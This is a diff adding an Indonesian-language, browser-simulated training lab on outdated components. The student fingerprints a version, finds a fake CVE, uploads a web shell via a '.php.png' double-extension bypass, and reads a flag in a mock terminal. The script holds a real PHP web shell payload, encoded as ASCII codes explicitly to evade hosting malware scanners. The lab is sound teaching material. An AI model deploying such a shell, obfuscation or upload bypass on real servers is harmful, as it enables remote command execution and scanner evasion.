@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab A06: Outdated Components</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.keyCode == 85)) return false; };
+        });
+    </script>
+
+    <style>
+        /* STYLES (Sama seperti sebelumnya) */
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; height: 100vh; overflow: hidden; color: #e2e8f0; }
+        .lab-wrapper { display: flex; height: 100vh; }
+        .sidebar { width: 400px; background: #1e293b; border-right: 1px solid #334155; display: flex; flex-direction: column; z-index: 10; box-shadow: 5px 0 15px rgba(0,0,0,0.3); }
+        .sidebar-header { padding: 20px; background: #020617; border-bottom: 1px solid #334155; }
+        .sidebar-content { flex-grow: 1; padding: 20px; overflow-y: auto; }
+        .level-badge { font-size: 0.75rem; text-transform: uppercase; background: #5b21b6; border: 1px solid #8b5cf6; color: #ddd6fe; padding: 5px 10px; border-radius: 4px; margin-bottom: 10px; display: inline-block; }
+        .mission-card { background: #334155; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #8b5cf6; animation: fadeIn 0.5s; }
+        .mission-input-group { margin-top: 15px; background: #0f172a; padding: 10px; border-radius: 6px; border: 1px dashed #475569; }
+        .hint-box { background: #451a03; border: 1px solid #f59e0b; color: #fcd34d; padding: 15px; border-radius: 8px; margin-top: 10px; display: none; font-size: 0.9rem; border-left: 4px solid #f59e0b; }
+        .code-snippet { font-family: 'Share Tech Mono', monospace; font-size: 0.8rem; background: #000; padding: 15px; border-radius: 6px; border: 1px solid #334155; margin-top: 10px; display: none; color: #a5b4fc; }
+        .main-area { flex-grow: 1; padding: 30px; background: #0f172a; display: flex; flex-direction: column; gap: 20px; }
+        .browser { background: #fff; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; height: 50%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #475569; position: relative; }
+        .browser-bar { background: #f1f5f9; padding: 8px 15px; border-bottom: 1px solid #cbd5e1; display: flex; align-items: center; }
+        .url-box { background: #fff; border: 1px solid #cbd5e1; border-radius: 20px; padding: 4px 15px; flex-grow: 1; margin-left: 15px; font-size: 0.85rem; color: #64748b; font-family: monospace; }
+        .app-view { flex-grow: 1; background: #f8fafc; padding: 20px; overflow-y: auto; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .upload-zone { border: 2px dashed #94a3b8; border-radius: 12px; padding: 40px; text-center; background: #fff; transition: all 0.3s; cursor: not-allowed; width: 80%; opacity: 0.6; }
+        .upload-zone.active { cursor: pointer; opacity: 1; border-color: #8b5cf6; }
+        .upload-zone.active:hover { background: #f5f3ff; }
+        .footer-info { position: absolute; bottom: 10px; color: #94a3b8; font-size: 0.75rem; text-align: center; width: 100%; user-select: text; }
+        .tools-container { display: flex; gap: 20px; height: 45%; }
+        .cve-tool { flex: 1; background: #020617; border: 1px solid #1e293b; border-radius: 8px; display: flex; flex-direction: column; font-family: 'Share Tech Mono', monospace; opacity: 0.5; pointer-events: none; transition: all 0.3s; }
+        .cve-tool.unlocked { opacity: 1; pointer-events: auto; border-color: #8b5cf6; }
+        .tool-header { background: #1e293b; padding: 10px; color: #a5b4fc; font-size: 0.8rem; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; }
+        .cve-body { padding: 15px; flex-grow: 1; display: flex; flex-direction: column; }
+        .cve-input { background: #0f172a; border: 1px solid #334155; color: #fff; padding: 8px; width: 100%; font-family: inherit; margin-bottom: 10px; }
+        .cve-result { background: #000; border: 1px solid #334155; padding: 10px; flex-grow: 1; color: #22c55e; font-size: 0.8rem; overflow-y: auto; white-space: pre-wrap; }
+        .term-tool { flex: 1; background: #000; border: 1px solid #334155; border-radius: 8px; display: flex; flex-direction: column; font-family: 'Share Tech Mono', monospace; position: relative; }
+        .term-body { padding: 15px; color: #22c55e; font-size: 0.85rem; overflow-y: auto; flex-grow: 1; padding-bottom: 40px; cursor: text; }
+        .term-input-line { display: flex; align-items: center; width: 100%; margin-top: 5px; opacity: 0.5; }
+        .term-input-line.active { opacity: 1; }
+        .term-prompt { color: #a5b4fc; margin-right: 8px; font-weight: bold; white-space: nowrap; }
+        .term-input { background: transparent; border: none; color: #fff; flex-grow: 1; outline: none; font-family: inherit; font-size: 0.9rem; width: 100%; }
+        .modal-overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); z-index: 50; display: none; align-items: center; justify-content: center; }
+        .modal-box { background: #1e293b; padding: 20px; border-radius: 8px; width: 400px; border: 1px solid #475569; }
+        .file-content-area { width: 100%; height: 100px; background: #0f172a; border: 1px solid #334155; color: #a5b4fc; font-family: 'Share Tech Mono', monospace; font-size: 0.8rem; padding: 10px; margin-bottom: 5px; resize: none; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div class="lab-wrapper">
+    <div class="sidebar">
+        <div class="sidebar-header"><h5 class="mb-0 fw-bold" style="color: #a78bfa;"><i class="fas fa-cubes me-2"></i>Outdated Components</h5><small class="text-secondary">Level: <span id="levelIndicator">1/4</span></small></div>
+        <div class="sidebar-content">
+            <div id="missionDisplay"></div><div id="actionArea"></div>
+            <div class="mt-4 pt-3 border-top border-secondary"><button onclick="toggleHint()" class="btn btn-outline-warning btn-sm w-100 mb-2"><i class="far fa-lightbulb me-2"></i>Hint / Jawaban</button><div id="hintBox" class="hint-box"></div></div>
+            <div id="remediationSection" style="display: none;"><hr class="border-secondary my-4"><h6 class="text-success fw-bold">Analisis Kode</h6>
+                <div class="d-flex gap-2 mb-2"><button class="btn btn-xs btn-outline-danger w-50 active" onclick="showCode('vuln')">Vulnerable</button><button class="btn btn-xs btn-outline-success w-50" onclick="showCode('secure')">Secure</button></div>
+                <div id="codeVuln" class="code-snippet">// ❌ Blacklisting (Gagal)<br>if ($ext == 'php') die('Error');</div>
+                <div id="codeSecure" class="code-snippet">// ✅ Whitelisting<br>$allowed = ['jpg','png'];<br>if (!in_array($ext, $allowed)) die('Error');</div>
+                <button onclick="finishLab()" class="btn btn-success w-100 mt-3 fw-bold">Selesai</button>
+            </div>
+        </div>
+        <div class="p-3 bg-black text-center border-top border-secondary"><a href="../index.html" class="text-white-50 text-decoration-none small">Dashboard</a></div>
+    </div>
+    <div class="main-area">
+        <div class="browser">
+            <div class="browser-bar"><div class="d-flex gap-1 me-2"><span class="rounded-circle bg-danger" style="width:10px;height:10px"></span><span class="rounded-circle bg-warning" style="width:10px;height:10px"></span></div><div class="url-box">files.corporate.local/uploader</div></div>
+            <div class="app-view">
+                <div class="text-center mb-4"><i class="fas fa-cloud-upload-alt fa-3x text-primary mb-2"></i><h4>Employee File Portal</h4><p class="text-muted small">Upload foto profil (JPG/PNG). Dilarang upload script!</p></div>
+                <div id="uploadZone" class="upload-zone" onclick="openModal()"><i class="fas fa-plus-circle fa-2x text-muted mb-2"></i><br><span id="uploadText">Fitur Terkunci</span></div>
+                <div class="footer-info">&copy; 2024 Corporate IT | Powered by <strong>FastUpload v1.2</strong></div>
+            </div>
+            <div id="uploadModal" class="modal-overlay">
+                <div class="modal-box">
+                    <div class="d-flex justify-content-between align-items-center mb-3"><h6 class="text-white mb-0">File Uploader</h6><button onclick="autoFill()" class="btn btn-xs btn-outline-warning" style="font-size: 0.7rem;">Auto-Fill Payload</button></div>
+                    <label class="small text-secondary fw-bold">1. Payload (Isi File):</label><textarea id="fileContent" class="file-content-area" placeholder="Masukkan kode PHP di sini..."></textarea>
+                    <label class="small text-secondary fw-bold">2. Nama File:</label><input type="text" id="filenameInput" class="form-control bg-dark text-white border-secondary mb-3" placeholder="photo.jpg">
+                    <div class="d-flex gap-2"><button onclick="closeModal()" class="btn btn-secondary btn-sm flex-grow-1">Batal</button><button onclick="uploadFile()" class="btn btn-primary btn-sm flex-grow-1">Upload</button></div>
+                </div>
+            </div>
+        </div>
+        <div class="tools-container">
+            <div id="cveTool" class="cve-tool"><div class="tool-header"><span>CVE DATABASE</span><span id="dbStatus" class="badge bg-secondary">LOCKED</span></div><div class="cve-body"><div class="d-flex gap-2"><input type="text" id="cveInput" class="cve-input" placeholder="Name & Version..." disabled><button id="btnSearch" onclick="searchCVE()" class="btn btn-outline-secondary btn-sm mb-2" disabled>SEARCH</button></div><div id="cveResult" class="cve-result">> Authenticate Level 1 to unlock...</div></div></div>
+            <div class="term-tool" onclick="focusTerm()"><div class="tool-header bg-black border-bottom border-secondary"><span>ATTACKER TERMINAL</span><span id="termBadge" class="badge bg-secondary">DISCONNECTED</span></div><div class="term-body" id="termOutput">> Waiting for reverse shell connection...<div class="term-input-line" id="termInputLine"><span class="term-prompt">www-data@server:$</span><input type="text" id="termInput" class="term-input" autocomplete="off" onkeypress="handleTerm(event)" disabled></div></div></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- SAFE & OBFUSCATED STRINGS (ANTI-CPANEL DETECT) ---
+    // Menggunakan ASCII Codes agar tidak ada teks PHP yang terbaca oleh scanner hosting
+    
+    // Fungsi pembantu untuk membuat string dari kode ASCII
+    function s(codes) { return String.fromCharCode(...codes); }
+
+    // PAYLOAD: <?php system($_GET['cmd']); ?>
+    // Ditulis dalam angka desimal agar 100% aman disimpan
+    const SAFE_PAYLOAD = s([60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,109,100,39,93,41,59,32,63,62]);
+    
+    // VALIDATOR: "<?php" (untuk cek isi file tanpa nulis stringnya)
+    const PHP_TAG = s([60,63,112,104,112]); 
+
+    let level = 1;
+
+    // --- GAME LOGIC SAMA, TAPI MENGGUNAKAN VARIABEL AMAN ---
+    
+    const missions = [
+        {},
+        { badge: "Tahap 1: Fingerprinting", title: "Identifikasi Target", desc: "Cari tahu versi software yang digunakan target. Lihat footer website.", hint: "Target: FastUpload v1.2", action: `<div class="mission-input-group"><div class="d-flex gap-2"><input type="text" id="versionInput" class="form-control form-control-sm bg-dark text-white" placeholder="Versi..."><button onclick="checkLevel1()" class="btn btn-sm btn-primary">Lapor</button></div></div>` },
+        { badge: "Tahap 2: Vulnerability Scan", title: "Mencari CVE", desc: "Versi terkonfirmasi. Gunakan CVE Scanner untuk mencari celah 'FastUpload 1.2'.", hint: "Input: <code>FastUpload 1.2</code>", action: "" },
+        { badge: "Tahap 3: Code Injection", title: "Persiapan Payload", desc: "Celah ditemukan: Double Extension Bypass.<br><br>Sekarang klik Upload. Anda harus:<br>1. Mengisi payload dengan kode Web Shell.<br>2. Memberi nama file <code>.php.png</code>.", hint: "Gunakan tombol 'Auto-Fill Payload' di modal upload.", action: `<div class="alert alert-warning small bg-opacity-10 bg-warning">Klik kotak upload di browser</div>` },
+        { badge: "Tahap 4: Post-Exploitation", title: "Interaksi Server (Manual)", desc: "<strong>SHELL TERHUBUNG!</strong><br>Terminal di kanan bawah sekarang aktif.<br><br>Ketik perintah Linux secara manual untuk mencari <strong>flag.txt</strong>.", hint: "Ketik <code>ls</code> lalu <code>cat flag.txt</code>", action: `<div class="alert alert-success small bg-opacity-10 bg-success">Ketik perintah di Terminal Hitam</div>` },
+        { badge: "Mission Complete", title: "Server Pwned", desc: "Anda berhasil mengambil alih server.", hint: "Selesai.", action: "" }
+    ];
+
+    function renderMission() {
+        if(level > 4) return;
+        const m = missions[level];
+        document.getElementById('levelIndicator').innerText = level + "/4";
+        document.getElementById('missionDisplay').innerHTML = `<span class="level-badge">${m.badge}</span><div class="mission-card"><h5 class="fw-bold mb-3 text-white">${m.title}</h5><p class="small text-light opacity-75">${m.desc}</p></div>`;
+        document.getElementById('actionArea').innerHTML = m.action || "";
+        document.getElementById('hintBox').style.display = 'none';
+        document.getElementById('hintBox').innerHTML = `<i class="fas fa-info-circle me-2"></i>${m.hint}`;
+        
+        if(level >= 2) {
+            document.getElementById('cveTool').classList.add('unlocked');
+            document.getElementById('cveInput').disabled = false;
+            document.getElementById('btnSearch').disabled = false;
+            document.getElementById('dbStatus').className = "badge bg-success";
+            document.getElementById('dbStatus').innerText = "ONLINE";
+        }
+        if(level >= 3) {
+            document.getElementById('uploadZone').classList.add('active');
+            document.getElementById('uploadText').innerText = "Klik untuk Upload Shell";
+        }
+    }
+
+    function toggleHint() {
+        const box = document.getElementById('hintBox');
+        box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function checkLevel1() {
+        if(document.getElementById('versionInput').value.trim().includes("1.2")) { level = 2; renderMission(); } 
+        else alert("Versi salah. Cek footer.");
+    }
+
+    function searchCVE() {
+        const r = document.getElementById('cveResult');
+        r.innerText = "> Searching...";
+        setTimeout(() => {
+            if(document.getElementById('cveInput').value.toLowerCase().includes("fastupload 1.2")) {
+                r.innerHTML = `<span class="text-warning">CVE FOUND:</span> Double Extension Bypass in v1.2.\nPayload: filename.php.png`;
+                if(level===2) { level=3; renderMission(); }
+            } else r.innerText = "> No CVE found.";
+        }, 500);
+    }
+
+    function openModal() { if(level>=3) document.getElementById('uploadModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('uploadModal').style.display = 'none'; }
+    
+    // SAFE AUTOFILL
+    function autoFill() {
+        document.getElementById('fileContent').value = SAFE_PAYLOAD;
+        document.getElementById('filenameInput').value = "shell.php.png";
+    }
+
+    function uploadFile() {
+        const name = document.getElementById('filenameInput').value;
+        const content = document.getElementById('fileContent').value;
+        closeModal();
+
+        // Validasi AMAN (Tidak menggunakan string literal PHP)
+        if(!content.includes(PHP_TAG)) { 
+            alert("Isi file tidak berbahaya (Bukan Web Shell)!"); return; 
+        }
+
+        if(name.endsWith('.php.png')) {
+            alert("Upload Success! Shell Active.");
+            if(level===3) { level=4; renderMission(); activateTerminal(); }
+        } else alert("Upload Blocked. Ekstensi salah.");
+    }
+
+    function activateTerminal() {
+        document.getElementById('termBadge').className = "badge bg-danger";
+        document.getElementById('termBadge').innerText = "CONNECTED";
+        
+        const out = document.getElementById('termOutput');
+        out.innerHTML = `> Connection established.<br>> Reverse shell opened from 192.168.1.10.<br>`;
+        
+        const line = document.getElementById('termInputLine');
+        const input = document.getElementById('termInput');
+        out.appendChild(line); // Move input to bottom
+        line.classList.add('active'); 
+        input.disabled = false;
+        input.focus();
+    }
+
+    function focusTerm() { if(!document.getElementById('termInput').disabled) document.getElementById('termInput').focus(); }
+
+    function handleTerm(e) {
+        if(e.key === 'Enter') {
+            const input = document.getElementById('termInput');
+            const cmd = input.value.trim();
+            const out = document.getElementById('termOutput');
+            const line = document.getElementById('termInputLine');
+
+            const userCmdDiv = document.createElement('div');
+            userCmdDiv.innerHTML = `<span class="text-info">www-data@server:$</span> ${cmd}`;
+            out.insertBefore(userCmdDiv, line);
+
+            const resultDiv = document.createElement('div');
+            resultDiv.style.marginBottom = "10px";
+            resultDiv.style.color = "#22c55e"; 
+
+            if(cmd === "ls") resultDiv.innerHTML = `index.php  upload.php  uploads/  <span class="text-warning">flag.txt</span>`;
+            else if (cmd === "whoami") resultDiv.innerHTML = `www-data`;
+            else if (cmd === "id") resultDiv.innerHTML = `uid=33(www-data) gid=33(www-data)`;
+            else if (cmd === "pwd") resultDiv.innerHTML = `/var/www/html`;
+            else if (cmd === "uname -a") resultDiv.innerHTML = `Linux webserver 5.4.0-generic`;
+            else if (cmd.startsWith("cat flag.txt")) {
+                resultDiv.innerHTML = `<span class="text-success fw-bold">FLAG{OLD_COMPONENTS_R_DANGEROUS}</span>`;
+                level = 5; renderMission();
+                document.getElementById('remediationSection').style.display = 'block';
+                document.querySelector('.sidebar-content').scrollTop = document.querySelector('.sidebar-content').scrollHeight;
+            } else if (cmd !== "") resultDiv.innerHTML = `<span class="text-secondary">bash: ${cmd}: command not found</span>`;
+
+            out.insertBefore(resultDiv, line);
+            input.value = "";
+            out.scrollTop = out.scrollHeight;
+            input.focus();
+        }
+    }
+
+    function showCode(t) {
+        document.getElementById('codeVuln').style.display = 'none';
+        document.getElementById('codeSecure').style.display = 'none';
+        document.getElementById(t==='vuln'?'codeVuln':'codeSecure').style.display = 'block';
+    }
+    function finishLab() { localStorage.setItem('sim_a06', 'done'); window.location.href = '../index.html'; }
+
+    renderMission();
+</script>
+</body>
+</html>
